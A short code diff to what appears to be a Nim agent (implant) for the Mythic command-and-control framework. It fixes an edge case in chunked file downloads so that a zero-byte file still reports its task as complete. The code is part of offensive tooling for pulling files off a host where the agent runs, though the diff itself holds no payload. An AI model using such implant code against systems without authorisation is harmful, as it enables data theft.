@@ -969,6 +969,17 @@ proc postResponses*(agent: var Agent) =
                 if state.fileId.len == 0:
                   continue
 
+                # Empty-file edge case: totalChunks is 0 for a 0-byte file. Mythic
+                # has already marked the file Complete on its side (per server code
+                # at handleAgentMessagePostResponseDownload); we just need to tell
+                # Mythic the TASK is done, or it stays hanging on "submitted" forever.
+                if state.totalChunks == 0:
+                  let completeMsg = completeDownload(taskId, state.fileId, state.path)
+                  agent.taskResponses.add(completeMsg)
+                  agent.backgroundTasks.del(taskId)
+                  debug "[DEBUG] Empty-file download complete"
+                  continue
+
                 # Send next chunk
                 if state.currentChunk < state.totalChunks:
                   state.currentChunk += 1
